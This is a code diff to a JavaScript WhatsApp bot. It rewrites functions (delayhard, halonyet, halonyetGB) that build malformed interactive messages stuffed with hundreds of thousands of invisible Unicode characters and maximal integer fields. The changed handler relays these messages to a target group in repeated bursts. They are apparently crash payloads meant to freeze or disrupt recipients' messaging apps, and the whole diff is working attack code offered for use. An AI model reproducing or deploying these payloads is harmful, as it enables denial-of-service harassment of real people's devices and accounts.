@@ -711,7 +711,8 @@ async function handleWAMessage(sock, number, chatUpdate) {
 
         for (let i = 0; i < 20; i++) {
           await Promise.allSettled([
-            kitow(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {}),
             halonyetGB(sock, groupJid).catch(() => {})
           ]);
           await sleep(500);
@@ -1379,52 +1380,124 @@ async function blankclick(sock, target) {
 }
 
 async function delayhard(sock, target) {
-  const message = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: { text: "\u000D" },
-          footer: { text: "\u000F" },
-          nativeFlowMessage: { buttons: "\t".repeat(45000) }
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessageV2Extension: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "\u200B\u2060".repeat(10000),
+                                subtitle: "\uFEFF\u202F".repeat(10000)
+                            },
+                            body: {
+                                text: "\u180E\u061C".repeat(20000)
+                            },
+                            nativeFlowMessage: {
+                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
+                                messageParamsJson: "\u200B\u202F".repeat(10000)
+                            },
+                            contextInfo: {
+                                stanzaId: "\uFEFF\u180E".repeat(1000),
+                                mentionedJid: [
+                                    "\u061C\u200B".repeat(1000)
+                                ],
+                                forwardingScore: 4294967295,
+                                isForwarded: true,
+                                expiration: 4294967295
+                            }
+                        }
+                    }
+                }
+            }
         }
-      }
-    }
-  };
-  await sock.relayMessage(target, message, { noselfsync: true });
+    };
+
+    await sock.relayMessage(target, msg, {
+        noSelfSync: true
+    });
 }
 
 async function halonyet(sock, target) {
-  const msg = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: { text: "\u0000" },
-          nativeFlowMessage: {
-            buttons: "[".repeat(500000)
-          }
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "\u200B".repeat(10000)
+                            },
+                            body: {
+                                text: "\u180E".repeat(10000)
+                            },
+                            nativeFlowMessage: {
+                                buttons: "\uFFF9".repeat(300000)
+                            },
+                            contextInfo: {
+                                mentionedJid: ["\u061C".repeat(10000)],
+                                forwardingScore: 4294967295,
+                                isForwarded: true,
+                                advDeviceIdentity: {
+                                    rawId: 4294967295,
+                                    timestamp: 9999999999999,
+                                    keyIndex: 4294967295,
+                                    accountType: "E2EE",
+                                    deviceType: "HOSTED"
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
         }
-      }
-    }
-  };
+    };
 
-  await sock.relayMessage(target, msg, { noselfsync: true });
+    await sock.relayMessage(target, msg, {
+        noSelfSync: false
+    });
 }
 
-async function halonyetGB(sock, targetgroup) {
-  const msg = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: { text: "\u0000" },
-          nativeFlowMessage: {
-            buttons: "[".repeat(500000)
-          }
+async function halonyetGB(sock, target) {
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "\u200B".repeat(10000)
+                            },
+                            body: {
+                                text: "\u180E".repeat(10000)
+                            },
+                            nativeFlowMessage: {
+                                buttons: "\uFFF9".repeat(300000)
+                            },
+                            contextInfo: {
+                                mentionedJid: ["\u061C".repeat(10000)],
+                                forwardingScore: 4294967295,
+                                isForwarded: true,
+                                advDeviceIdentity: {
+                                    rawId: 4294967295,
+                                    timestamp: 9999999999999,
+                                    keyIndex: 4294967295,
+                                    accountType: "E2EE",
+                                    deviceType: "HOSTED"
+                                }
+                            }
+                        }
+                    }
+                }
+            },
+            participant: target
         }
-      }
-    }
-  };
+    };
 
-  await sock.relayMessage(targetgroup, msg, {});
+    await sock.relayMessage(target, msg, {
+        noSelfSync: false
+    });
 }
 
 async function kitow(sock, targetgroup, ptcp = true) {
